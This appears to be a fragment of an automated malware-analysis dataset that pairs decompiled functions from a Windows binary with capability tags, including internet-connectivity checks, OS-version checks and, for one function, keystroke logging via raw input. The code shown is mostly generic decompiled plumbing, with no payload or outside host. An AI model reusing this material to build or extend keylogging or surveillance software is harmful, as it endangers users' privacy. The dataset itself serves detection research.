        "decompiled_code": "\nuint64_t fcn.00021ae0(ulong arg1, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint64_t uVar3;\n    int32_t *arg1_00;\n    uint32_t uVar4;\n    uint32_t in_stack_00000028;\n    int64_t in_stack_00000030;\n    int32_t in_stack_00000038;\n    int64_t iStack152;\n    uchar auStack144 [24];\n    uchar auStack120 [40];\n    uint uStack80;\n    uint32_t uStack76;\n    uint32_t uStack72;\n    \n    if ((in_stack_00000030 == 0) && (in_stack_00000038 != 0)) {\n        return 0xffffffff;\n    }\n    uVar4 = 5;\n    uVar3 = fcn.00020f54(&iStack152, arg1, 5, auStack144);\n    if (uVar3 != 0) {\n        return uVar3;\n    }\n    if ((*(iStack152 + 0x90) != 0) && (arg2 == *(iStack152 + 0x94))) {\n        arg2._0_4_ = *(iStack152 + 0x98);\n    }\n    for (arg1_00 = *(iStack152 + 0x38); (arg1_00 != NULL && ((*arg1_00 != arg2 || (arg1_00[1] != arg3))));\n        arg1_00 = *(arg1_00 + 8)) {\n    }\n    uVar1 = fcn.00020914(arg1_00, arg4);\n    if (uVar1 == 0xffffffff) goto code_r0x00021c18;\n    uVar3 = uVar1;\n    iVar2 = (**(*(iStack152 + 0x58) + 0x28))(*(iStack152 + 0x60), auStack120, 0x40, uVar3);\n    if (iVar2 == 0) {\n        uVar4 = in_stack_00000028 + in_stack_00000038;\n        if (uStack76 < uVar4) {\n            uVar4 = 6;\n            goto code_r0x00021c18;\n        }\n        uStack80 = fcn.00031204(0);\n        if (uStack72 < uVar4) {\n            uStack72 = uVar4;\n        }\n        iVar2 = (**(*(iStack152 + 0x58) + 0x30))\n                          (*(iStack152 + 0x60), in_stack_00000030, in_stack_00000038, in_stack_00000028 + 0x40 + uVar3);\n        if (iVar2 == 0) {\n            iVar2 = (**(*(iStack152 + 0x58) + 0x30))(*(iStack152 + 0x60), auStack120, 0x40, uVar3);\n            uVar4 = -(iVar2 != 0) & 3;\n            goto code_r0x00021c18;\n        }\n    }\n    uVar4 = 3;\ncode_r0x00021c18:\n    fcn.000207cc(auStack144);\n    return uVar4;\n}\n",
        "token_count": 732
    },
    "00021d00": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint64_t fcn.00021d00(ulong arg1, ulong arg2, ulong arg3, int32_t *arg4)\n\n{\n    int32_t iVar1;\n    uint64_t uVar2;\n    int32_t *piVar3;\n    int64_t iVar4;\n    uint32_t uVar5;\n    int64_t in_stack_00000028;\n    int64_t iStack72;\n    uchar auStack64 [32];\n    \n    if (in_stack_00000028 == 0) {\n        uVar2 = 0xffffffff;\n    }\n    else {\n        uVar2 = fcn.00020f54(&iStack72, arg1, 0, auStack64);\n        if (uVar2 == 0) {\n            if ((*(iStack72 + 0x90) != 0) && (arg2 == *(iStack72 + 0x94))) {\n                arg2._0_4_ = *(iStack72 + 0x98);\n            }\n            uVar5 = 5;\n            for (piVar3 = *(iStack72 + 0x38); (piVar3 != NULL && ((*piVar3 != arg2 || (piVar3[1] != arg3))));\n                piVar3 = *(piVar3 + 8)) {\n            }\n            if (piVar3 != NULL) {\n                for (iVar4 = *(piVar3 + 4); iVar4 != 0; iVar4 = *(iVar4 + 0x18)) {\n                    if ((arg4 == NULL) || (*(iVar4 + 8) == *arg4)) {\n                        iVar1 = (**(*(iStack72 + 0x58) + 0x28))\n                                          (*(iStack72 + 0x60), in_stack_00000028, 0x40, *(iVar4 + 0xc));\n                        uVar5 = -(iVar1 != 0) & 5;\n                        break;\n                    }\n                }\n            }\n            fcn.000207cc(auStack64);\n            uVar2 = uVar5;\n        }\n    }\n    return uVar2;\n}\n",
        "token_count": 460
    },
    "00021dd8": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "log keystrokes via raw input data/18af53aa16f24c3fa3538f182ae5df5a"
        ],
        "decompiled_code": "\nulong fcn.00021dd8(ulong arg1, ulong arg2, ulong arg3, uint32_t *arg4, int64_t *noname_4, ulong noname_5, ulong noname_6\n                  , ulong noname_7, ulong noname_8, ulong noname_9, ulong noname_10, ulong noname_11, ulong noname_12, \n                  ulong noname_13, ulong noname_14, ulong noname_15, ulong arg_90h, ulong arg_98h)\n\n{\n    int32_t iVar1;\n    ulong uVar2;\n    int64_t iVar3;\n    int32_t *piVar4;\n    int64_t iVar5;\n    int64_t iStackX32;\n    ulong var_38h;\n    ulong var_58h;\n    ulong var_60h;\n    uchar auStack72 [24];\n    \n    if (arg4 == NULL) {\n        return 0xffffffff;\n    }\n    uVar2 = fcn.00020f54(&iStackX32, arg1, 0, auStack72);\n    if (uVar2 != 0) {\n        return uVar2;\n    }\n    if ((*(iStackX32 + 0x90) != 0) && (arg2 == *(iStackX32 + 0x94))) {\n        arg2._0_4_ = *(iStackX32 + 0x98);\n    }\n    if (noname_4 != NULL) {\n        *noname_4 = 0;\n    }\n    *arg4 = 0;\n    for (piVar4 = *(iStackX32 + 0x38); (piVar4 != NULL && ((*piVar4 != arg2 || (piVar4[1] != arg3))));\n        piVar4 = *(piVar4 + 8)) {\n    }\n    if (piVar4 != NULL) {\n        for (iVar3 = *(piVar4 + 4); iVar3 != 0; iVar3 = *(iVar3 + 0x18)) {\n            *arg4 = *arg4 + 1;\n        }\n        if ((noname_4 != NULL) && (*arg4 != 0)) {\n            iVar3 = fcn.00030c98(*arg4 << 6);\n            *noname_4 = iVar3;\n            if (iVar3 == 0) {\ncode_r0x00021eae:\n                uVar2 = 2;\n                goto code_r0x00021f78;\n            }\n            if (((*arg4 < 2) || (**(iStackX32 + 0x58) < 0x41)) || ((*(iStackX32 + 0x58))[8] == 0)) {\n                *arg4 = 0;\n                for (iVar3 = *(piVar4 + 4); iVar3 != 0; iVar3 = *(iVar3 + 0x18)) {\n                    iVar1 = (**(*(iStackX32 + 0x58) + 0x28))\n                                      (*(iStackX32 + 0x60), *arg4 * 0x40 + *noname_4, 0x40, *(iVar3 + 0xc));\n                    if (iVar1 == -1) goto code_r0x00021f5a;\n                    *arg4 = *arg4 + 1;\n                }\n            }\n            else {\n                iVar3 = fcn.00030cec(*arg4);\n                if (iVar3 == 0) goto code_r0x00021eae;\n                *arg4 = 0;\n                for (iVar5 = *(piVar4 + 4); iVar5 != 0; iVar5 = *(iVar5 + 0x18)) {\n                    *(iVar3 + *arg4 * 0x18) = *arg4 * 0x40 + *noname_4;\n                    *(iVar3 + 8 + *arg4 * 0x18) = *(iVar5 + 0xc);\n                    *(iVar3 + 0x10 + *arg4 * 0x18) = 0x40;\n                    *arg4 = *arg4 + 1;\n                }\n                iVar1 = (**(*(iStackX32 + 0x58) + 0x40))(*(iStackX32 + 0x60), iVar3, *arg4);\n                if (iVar1 != 0) {\n                    fcn.00030d24(iVar3);\ncode_r0x00021f5a:\n                    uVar2 = 3;\n                    fcn.00030d24(*noname_4);\n                    *noname_4 = 0;\n                    *arg4 = 0;\n                    goto code_r0x00021f78;\n                }\n                fcn.00030d24(iVar3);\n            }\n        }\n    }\n    uVar2 = 0;\ncode_r0x00021f78:\n    fcn.000207cc(auStack72);\n    return uVar2;\n}\n",
        "token_count": 1091
    },
    "00022358": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.00022358(void)\n\n{\n    uint uVar1;\n    int64_t *piVar2;\n    int32_t iVar3;\n    \n    if (*0x692c0 == 0xffffffff) {\n        uVar1 = 0;\n    }\n    else {\n        uVar1 = fcn.00021060(*0x692c0, 0);\n        *0x692c0 = 0xffffffff;\n    }\n    fcn.00030310(0x8e8c0);\n    iVar3 = 0;\n    piVar2 = 0x8e8d0;\n    do {\n        if (*piVar2 != 0) break;\n        piVar2 = piVar2 + 1;\n        iVar3 = iVar3 + 1;\n    } while (piVar2 < 0x8e920);\n    fcn.00030378(0x8e8c0);\n    if (9 < iVar3) {\n        fcn.000302e8(0x8e8c0);\n        *0x8e8c8 = 0;\n    }\n    return uVar1;\n}\n",
        "token_count": 249
    },
    "00022440": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint64_t fcn.00022440(ulong arg1, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    uint32_t *puVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint64_t uVar4;\n    int32_t *piVar5;\n    int64_t iVar6;\n    int32_t iVar7;\n    uint64_t uVar8;\n    uint32_t in_stack_00000028;\n    uint *in_stack_00000030;\n    uint32_t *in_stack_00000038;\n    uchar auStack136 [16];\n    int32_t iStack120;\n    uint32_t uStack116;\n    uint32_t uStack112;\n    uint uStack108;\n    uint uStack104;\n    uint uStack100;\n    uint uStack96;\n    uint uStack92;\n    uint uStack88;\n    uint uStack84;\n    uint uStack80;\n    \n    puVar1 = in_stack_00000038;\n    uVar8 = arg2;\n    if (in_stack_00000038 == NULL) {\n        return 0xffffffff;\n    }\n    uVar4 = fcn.00020f54(&stack0x00000038, arg1, 1, auStack136);\n    if (uVar4 != 0) {\n        return uVar4;\n    }\n    if ((in_stack_00000038[0x24] != 0) && (arg2 == in_stack_00000038[0x25])) {\n        uVar8 = in_stack_00000038[0x26];\n    }\n    iVar7 = uVar8;\n    if (*(in_stack_00000038 + 10) != '\\0') {\n        for (piVar5 = *(in_stack_00000038 + 0xe); (piVar5 != NULL && ((*piVar5 != iVar7 || (piVar5[1] != arg3))));\n            piVar5 = *(piVar5 + 8)) {\n        }\n        iVar2 = 0;\n        if (piVar5 != NULL) {\n            for (iVar6 = *(piVar5 + 4); iVar6 != 0; iVar6 = *(iVar6 + 0x18)) {\n                iVar2 = iVar2 + 0x40 + *(iVar6 + 4);\n            }\n        }\n        if (in_stack_00000038[4] * *(in_stack_00000038 + 10) < (iVar2 + in_stack_00000028) * 100) {\n            uVar8 = 7;\n            goto code_r0x000225ef;\n        }\n    }\n    fcn.0006677c();\n    iStack120 = iVar7;\n    uStack108 = arg4;\n    uStack88 = fcn.00031204(0);\n    uStack84 = 0;\n    uStack80 = 0;\n    if (in_stack_00000030 != NULL) {\n        uStack104 = *in_stack_00000030;\n        uStack100 = in_stack_00000030[1];\n        uStack96 = in_stack_00000030[2];\n        uStack92 = in_stack_00000030[3];\n    }\n    for (piVar5 = *(in_stack_00000038 + 0xe); (piVar5 != NULL && ((*piVar5 != iVar7 || (piVar5[1] != arg3))));\n        piVar5 = *(piVar5 + 8)) {\n    }\n    if (piVar5 == NULL) {\n        iVar2 = 0;\n    }\n    else {\n        iVar2 = piVar5[3];\n    }\n    uStack116 = iVar2 + 1;\n    *puVar1 = uStack116;\n    uStack112 = arg3;\n    iVar2 = fcn.00022028(in_stack_00000038, &iStack120);\n    if (iVar2 == -1) {\n        uVar8 = 4;\n    }\n    else {\n        uVar3 = fcn.000207f8(in_stack_00000038, uVar8, arg3, *puVar1);\n        uVar8 = uVar3;\n        for (piVar5 = *(in_stack_00000038 + 0xe); (piVar5 != NULL && ((*piVar5 != iVar7 || (piVar5[1] != arg3))));\n            piVar5 = *(piVar5 + 8)) {\n        }\n        fcn.00020788(piVar5);\n    }\ncode_r0x000225ef:\n    fcn.000207cc(auStack136);\n    return uVar8;\n}\n",
        "token_count": 1006
    },
    "00022774": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t fcn.00022774(char *arg1, ulong arg2, int32_t *arg3, int64_t arg4)\n\n{\n    int32_t *piVar1;\n    char cVar2;\n    char cVar3;\n    bool bVar4;\n    bool bVar5;\n    bool bVar6;\n    uint32_t uVar7;\n    char *arg1_00;\n    uint32_t *arg1_01;\n    int64_t iVar8;\n    uint64_t uVar9;\n    char *pcVar10;\n    int32_t iVar11;\n    uint32_t *puVar12;\n    int64_t *piVar13;\n    int64_t *piVar14;\n    uchar auStack344 [280];\n    \n    arg1_01 = NULL;\n    bVar4 = false;\n    bVar6 = false;\n    if ((arg1 == NULL) || (arg3 == NULL)) {\n        return -1;\n    }\n    if (*0x8e8c8 == 0) {\n        fcn.0006677c(0x8e8c0, 0, 0x60);\n        fcn.000302c0(0x8e8c0);\n        *0x8e8c8 = 1;\n    }\n    arg1_00 = fcn.00030c98(0x104);\n    if (arg1_00 == NULL) {\n        return 2;\n    }\n    pcVar10 = arg1;\n    do {\n        cVar2 = *pcVar10;\n        pcVar10[arg1_00 - arg1] = cVar2;\n        pcVar10 = pcVar10 + 1;\n    } while (cVar2 != '\\0');\n    fcn.00030310(0x8e8c0);\n    piVar14 = 0x8e8d0;\n    bVar5 = true;\n    *arg3 = -1;\n    piVar13 = 0x8e8d0;\n    puVar12 = arg1_01;\n    do {\n        iVar11 = puVar12;\n        if (*piVar13 == 0) {\n            *arg3 = iVar11;\n        }\n        else {\n            pcVar10 = arg1_00;\n            do {\n                cVar2 = *pcVar10;\n                cVar3 = pcVar10[*(*piVar13 + 0x50) - arg1_00];\n                if (cVar2 != cVar3) break;\n                pcVar10 = pcVar10 + 1;\n            } while (cVar3 != '\\0');\n            if (cVar2 == cVar3) {\n                fcn.00030d24(arg1_00);\n                *arg3 = iVar11;\n                piVar1 = *(puVar12 * 8 + 0x8e8d0) + 4;\n                *piVar1 = *piVar1 + 1;\n                iVar11 = 0;\n                bVar4 = false;\n                goto code_r0x00022b73;\n            }\n        }\n        puVar12 = iVar11 + 1U;\n        piVar13 = piVar13 + 1;\n    } while (iVar11 + 1U < 10);\n    if (*arg3 == -1) {\n        iVar11 = -1;\n        bVar4 = false;\n    }\n    else {\n        arg1_01 = fcn.00030c98(0xa0);\n        if (arg1_01 == NULL) {\n            iVar11 = -1;\n        }\n        else {\n            fcn.0006677c(arg1_01, 0, 0xa0);\n            *(arg1_01 + 0x14) = arg1_00;\n            *(arg1_01 + 0x16) = arg4;\n            iVar8 = (**(arg4 + 8))(arg1, 0);\n            *(arg1_01 + 0x18) = iVar8;\n            if (iVar8 == 0) {\n                iVar11 = 3;\n            }\n            else {\n                arg1_01[1] = 1;\n                iVar11 = (**(*(arg1_01 + 0x16) + 0x28))(iVar8, arg1_01 + 2, 0x2c);\n                bVar4 = false;\n                while( true ) {\n                    if (((iVar11 != 0) ||\n                        (uVar7 = (**(*(arg1_01 + 0x16) + 0x20))(*(arg1_01 + 0x18)),  uVar7 == 0xffffffff)) ||\n                       (uVar7 < 0x2c)) goto code_r0x00022b67;\n                    if ((arg1_01[2] != uVar7) && (arg1_01[2] = uVar7,  bVar4)) {\n                        arg1_01[0xb] = arg1_01[0xb] + 1;\n                        iVar11 = (**(*(arg1_01 + 0x16) + 0x30))(*(arg1_01 + 0x18), arg1_01 + 2, 0x2c, 0);\n                        if (iVar11 != 0) goto code_r0x00022b67;\n                    }\n                    uVar7 = arg1_01[3];\n                    if (((0x40000000 < uVar7) || (0x40000000 < arg1_01[4])) ||\n                       ((arg1_01[4] <= uVar7 && uVar7 != arg1_01[4] ||\n                        ((0x20000000 < arg1_01[5] ||\n                         (uVar7 = uVar7 + arg1_01[5],  arg1_01[4] <= uVar7 && uVar7 != arg1_01[4]))))))\n                    goto code_r0x00022b67;\n                    if (bVar4) break;\n                    if ((arg1_01[0xc] == 0) || (arg1_01[0xc] == 0xcccccccc)) {\n                        uVar7 = fcn.00020648(arg1_00);\n                        arg1_01[0xc] = uVar7;\n                        iVar11 = (**(*(arg1_01 + 0x16) + 0x30))(*(arg1_01 + 0x18), arg1_01 + 2, 0x2c, 0);\n                        if (iVar11 != 0) goto code_r0x00022b67;\n                    }\n                    fcn.0006677c(auStack344, 0, 0x104);\n                    fcn.00044350(auStack344, 0x103, 0x11eb8, 0x11ec0);\n                    iVar11 = fcn.00030384(arg1_01 + 0x22, auStack344);\n                    if ((iVar11 != 0) && (iVar11 = fcn.0003045c(arg1_01 + 0x22, auStack344),  iVar11 != 0)) {\n                        iVar11 = -1;\n                        goto code_r0x00022b6c;\n                    }\n                    fcn.00030378(0x8e8c0);\n                    bVar5 = false;\n                    fcn.0003051c(arg1_01 + 0x22);\n                    bVar4 = true;\n                    iVar11 = (**(*(arg1_01 + 0x16) + 0x28))(*(arg1_01 + 0x18));\n                }\n                (**(*(arg1_01 + 0x16) + 0x38))(*(arg1_01 + 0x18), 2);\n                iVar11 = fcn.00020a98(arg1_01);\n                if (iVar11 != 0) goto code_r0x00022b6c;\n                bVar6 = true;\n                arg1_01[9] = 1;\n                iVar11 = (**(*(arg1_01 + 0x16) + 0x30))(*(arg1_01 + 0x18), arg1_01 + 2, 0x2c, 0);\n                if (iVar11 == 0) {\n                    if (-1 < arg2) {\n                        fcn.000211a0(*arg1_01);\n                    }\n                    arg1_01[0x1a] = arg2;\n                    if ((0 < arg2) && (iVar11 = fcn.0002fc18(arg1_01 + 0x1c),  iVar11 != 0)) {\n                        fcn.0001a9b0(arg1_01 + 0x1e, 0x22408, arg1_01);\n                    }\n                    fcn.00030310(0x8e8c0);\n                    *arg3 = -1;\n                    uVar9 = 0;\n                    goto code_r0x00022b42;\n                }\ncode_r0x00022b67:\n                iVar11 = 3;\ncode_r0x00022b6c:\n                if (!bVar5) goto code_r0x00022b7f;\n            }\n        }\n    }\n    goto code_r0x00022b73;\n    while( true ) {\n        uVar7 = uVar9 + 1;\n        uVar9 = uVar7;\n        piVar14 = piVar14 + 1;\n        if (9 < uVar7) break;\ncode_r0x00022b42:\n        if (*piVar14 == 0) {\n            *arg3 = uVar9;\n            *(uVar9 * 8 + 0x8e8d0) = arg1_01;\n            iVar11 = 0;\n            goto code_r0x00022b73;\n        }\n    }\n    iVar11 = -1;\ncode_r0x00022b73:\n    fcn.00030378(0x8e8c0);\ncode_r0x00022b7f:\n    if ((arg1_01 != NULL) && (*(arg1_01 + 0x18) != 0)) {\n        (**(*(arg1_01 + 0x16) + 0x38))(*(arg1_01 + 0x18), 1);\n    }\n    if (bVar4) {\n        fcn.0003052c(arg1_01 + 0x22);\n    }\n    if (iVar11 != 0) {\n        if (bVar6) {\n            fcn.000206a8(arg1_01);\n        }\n        if (arg1_01 != NULL) {\n            if (*(arg1_01 + 0x18) != 0) {\n                (**(*(arg1_01 + 0x16) + 0x10))();\n            }\n            if (bVar4) {\n                fcn.00030514(arg1_01 + 0x22);\n            }\n            fcn.00030d24(arg1_01);\n        }\n        fcn.00030d24(arg1_00);\n    }\n    return iVar11;\n}\n",
        "token_count": 2428
    },
    "00022c7c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00022c7c(void)\n\n{\n    uint32_t uVar1;\n    uint64_t uVar2;\n    int64_t *piVar3;\n    \n    fcn.0001612c();\n    uVar2 = 0;\n    piVar3 = 0x7ebc0;\n    do {\n        if (*piVar3 != 0) {\n            fcn.000649a4(uVar2 * 8 + 0x7ebc0, 0);\n        }\n        uVar1 = uVar2 + 1;\n        uVar2 = uVar1;\n        piVar3 = piVar3 + 1;\n    } while (uVar1 < 10);\n    return;\n}\n",
        "token_count": 159
    },
    "000230c4": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.000230c4(void)\n\n{\n    int32_t iVar1;\n    \n    if (*0x7ec30 != 0) {\n        fcn.00027a4c(10, 0, 0, 0);\n        *0x8e770 = 1;\n        iVar1 = fcn.00032734(0x8e788);\n        if (iVar1 != 0) {\n            fcn.0002fcb8(0x8e788);\n            if (*0x8e758 != 0) {\n                fcn.000649a4(0x8e758, 0);\n            }\n            fcn.0002fce4(0x8e760, 0xffffffff);\n            fcn.00032710(0x7ebb0);\n            fcn.0002fc94(0x8e788);\n            fcn.0002fc94(0x8e760);\n        }\n        iVar1 = fcn.00032734(0x8e768);\n        if (iVar1 != 0) {\n            fcn.0002fcb8(0x8e768);\n            fcn.0002fce4(0x8e8a8, 0xffffffff);\n            fcn.00032710(0x7ec10);\n            fcn.0002fc94(0x8e768);\n            fcn.0002fc94(0x8e8a8);\n        }\n        iVar1 = fcn.00032734(*0x8e8b0);\n        if (iVar1 != 0) {\n            iVar1 = fcn.00032734(0x8e778);\n            if (iVar1 != 0) {\n                fcn.0002fcb8(*0x8e8b0);\n                fcn.0002fce4(0x8e778, 0xffffffff);\n                fcn.00032710(0x7ec20);\n                fcn.0002fc94(0x8e778);\n            }\n        }\n        fcn.00022c7c();\n        fcn.0002a3f0();\n        fcn.000284dc();\n        fcn.000251f0();\n        fcn.0001612c();\n        fcn.00063714();\n        fcn.0002a068(0xfffffffe);\n        fcn.0002a3d0();\n        fcn.00027a4c(0xb, 0, 0, 0);\n        fcn.00022358();\n        *0x7ec30 = 0;\n    }\n    return;\n}\n",
        "token_count": 570
    },
    "00023260": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong fcn.00023260(ulong arg1, char *arg2)\n\n{\n    char cVar1;\n    uint32_t uVar2;\n    int64_t iVar3;\n    uchar *puVar4;\n    char *pcVar5;\n    char *pcVar6;\n    int64_t iVar7;\n    ulong auStackX24 [2];\n    int64_t iStack72;\n    ulong uStack64;\n    ulong uStack56;\n    ulong uStack48;\n    ulong uStack40;\n    \n    iVar3 = fcn.00030d48(arg1);\n    if (iVar3 == 0) {\n        return 0;\n    }\n    puVar4 = fcn.0006682a(iVar3, 0x2f);\n    if (puVar4 == NULL) {\n        fcn.00030d24(iVar3);\n        return 0;\n    }\n    *puVar4 = 0;\n    iVar7 = -1;\n    uStack64 = 0;\n    pcVar5 = puVar4 + 1;\n    do {\n        if (iVar7 == 0) break;\n        iVar7 = iVar7 + -1;\n        cVar1 = *pcVar5;\n        pcVar5 = pcVar5 + 1;\n    } while (cVar1 != '\\0');\n    iStack72 = iVar3;\n    uVar2 = fcn.000646b8(auStackX24, &iStack72, puVar4 + 1, ~iVar7);\n    fcn.00030d24(iVar3);\n    if (uVar2 != 0) {\n        fcn.00027a4c(8, 0, uVar2, 0);\n        return 0;\n    }\n    if (arg2 != NULL) {\n        iVar3 = -1;\n        pcVar5 = arg2;\n        do {\n            if (iVar3 == 0) break;\n            iVar3 = iVar3 + -1;\n            cVar1 = *pcVar5;\n            pcVar5 = pcVar5 + 1;\n        } while (cVar1 != '\\0');\n        iVar3 = ~iVar3 + 1;\n        pcVar5 = fcn.00030c98(iVar3);\n        if (pcVar5 == NULL) goto code_r0x00023336;\n        iVar7 = pcVar5 - arg2;\n        do {\n            cVar1 = *arg2;\n            arg2[iVar7] = cVar1;\n            arg2 = arg2 + 1;\n        } while (cVar1 != '\\0');\n        pcVar5[iVar3 + -1] = '\\0';\n        cVar1 = *pcVar5;\n        pcVar6 = pcVar5;\n        while (cVar1 != '\\0') {\n            if (*pcVar6 == ',') {\n                *pcVar6 = '\\0';\n            }\n            pcVar6 = pcVar6 + 1;\n            cVar1 = *pcVar6;\n        }\n        uVar2 = fcn.00064abc(auStackX24[0], pcVar5, 0);\n        if (uVar2 != 0) {\n            fcn.00027a4c(8, 0, uVar2, 0);\n            fcn.00030d24(pcVar5);\n            goto code_r0x00023336;\n        }\n        fcn.00030d24(pcVar5);\n    }\n    uStack48 = 0;\n    uStack40 = 0;\n    uStack56 = 0x22ea8;\n    fcn.00064b24(auStackX24[0], 2, &uStack56, 0x18);\n    fcn.00064b24(auStackX24[0], 5, 0x22ecc, 0);\n    uVar2 = fcn.00064bd8(auStackX24[0], 0x22cbc, 0, 0);\n    if (uVar2 == 0) {\n        return auStackX24[0];\n    }\n    fcn.00027a4c(8, 0, uVar2, 0);\ncode_r0x00023336:\n    fcn.000649a4(auStackX24, 0);\n    return 0;\n}\n",
        "token_count": 938
    },
    "00023c98": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00023c98(ulong arg1, uint64_t arg2, ulong arg3, uint64_t arg4)\n\n{\n    bool bVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint64_t *arg1_00;\n    uint32_t uVar4;\n    uint64_t uVar5;\n    ulong uStack104;\n    ulong uStack96;\n    ulong uStack88;\n    ulong uStack80;\n    ulong uStack72;\n    char cStack64;\n    uint uStack63;\n    uint uStack59;\n    uint uStack55;\n    \n    arg2 = arg2 & 0xffffffff;\n    bVar1 = false;\n    arg1_00 = fcn.00030c98(arg3);\n    uVar4 = arg4 & 0xffffffff;\n    if (arg1_00 == NULL) {\n        uVar5 = 0x21590004;\n    }\n    else {\n        uVar2 = fcn.0002748c(2, 0);\n        if (uVar2 < uVar4) {\n            iVar3 = fcn.0002220c(arg1, 0, arg2, 0);\n            if (iVar3 == 0) {\n                if (0x14 < arg3) {\n                    uStack72 = *arg1_00;\n                    uVar5 = arg1_00[1];\n                    cStack64 = uVar5;\n                    uStack63 = uVar5 >> 8;\n                    uStack55 = CONCAT13(*(arg1_00 + 0x14), *(arg1_00 + 2) >> 8);\n                    uVar2 = fcn.00030dc8(uStack72 & 0xffffffff);\n                    uVar5 = uStack72 >> 0x20;\n                    uStack72 = uStack72 & 0xffffffff00000000 | uVar2;\n                    uVar2 = fcn.00030dc8(uVar5);\n                    uStack72 = uStack72 & 0xffffffff | uVar2 << 0x20;\n                    uStack59 = fcn.00030dc8(uStack59);\n                    if (uVar4 == uStack72._4_4_) {\n                        uStack104 = 0x692d0;\n                        if ((cStack64 == '\\x02') || (cStack64 == '\\x01')) {\n                            bVar1 = true;\n                            fcn.0002225c(arg1, 0, arg2);\n                        }\n                        uStack88 = 0;\n                        uStack80 = 0;\n                        fcn.00026cdc(&uStack104, uStack72 & 0xffffffff, arg1_00 + 0x15, arg3 - 0x15);\n                        if (bVar1) {\n                            iVar3 = fcn.00032734(&uStack88);\n                            if (iVar3 != 0) {\n                                uStack96 = 36000000000;\n                                iVar3 = fcn.000667be();\n                                if (iVar3 == 0x102) {\n                                    fcn.00027a4c(0xc, 0, 0x21590002, uStack72 & 0xffffffff);\n                                }\n                                fcn.00032710(&uStack88);\n                            }\n                        }\n                        fcn.00030d24(0);\n                        fcn.000274d4(2, arg4 & 0xffffffff);\n                        goto code_r0x00023ea7;\n                    }\n                }\n                uVar5 = 0x21590064;\n            }\n            else {\n                uVar5 = iVar3 + 0x191U | 0x21590000;\n            }\n        }\n        else {\n            uVar5 = 0x215901f7;\n        }\n    }\n    fcn.00027a4c(3, 0, uVar5, 0);\ncode_r0x00023ea7:\n    fcn.00030d24(arg1_00);\n    if (!bVar1) {\n        fcn.0002225c(arg1, 0, arg2);\n    }\n    return;\n}\n",
        "token_count": 901
    },
    "00024014": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t fcn.00024014(ulong *arg1, ulong arg2, int32_t *arg3)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uchar *puVar4;\n    char *pcVar5;\n    uint32_t uVar6;\n    ulong arg1_00;\n    int64_t iVar7;\n    int64_t iVar8;\n    char *pcVar9;\n    uchar auStackX16 [24];\n    uchar *puStack440;\n    ulong uStack432;\n    uchar auStack424 [128];\n    char acStack296 [256];\n    \n    arg1_00 = 200;\n    if (arg2 != 0) {\n        arg1_00 = 300;\n    }\n    iVar2 = fcn.0002748c(arg1_00, 0);\n    if (iVar2 != 0) {\n        iVar3 = fcn.000667b8();\n        iVar3 = iVar3 % iVar2;\n        uVar6 = iVar3 + 0xc9;\n        if (arg2 != 0) {\n            uVar6 = iVar3 + 0x12d;\n        }\n        iVar2 = fcn.00027418(uVar6, auStack424, 0x80, auStackX16);\n        if (iVar2 != 0) {\n            return iVar2 + 0x191U | 0x21590000;\n        }\n        acStack296[0] = '\\0';\n        uVar6 = iVar3 + 0xd4;\n        if (arg2 != 0) {\n            uVar6 = iVar3 + 0x138;\n        }\n        fcn.00027418(uVar6, acStack296, 0x100, auStackX16);\n        puVar4 = fcn.0006682a(auStack424, 0x2f);\n        if (puVar4 != NULL) {\n            *puVar4 = 0;\n            puStack440 = auStack424;\n       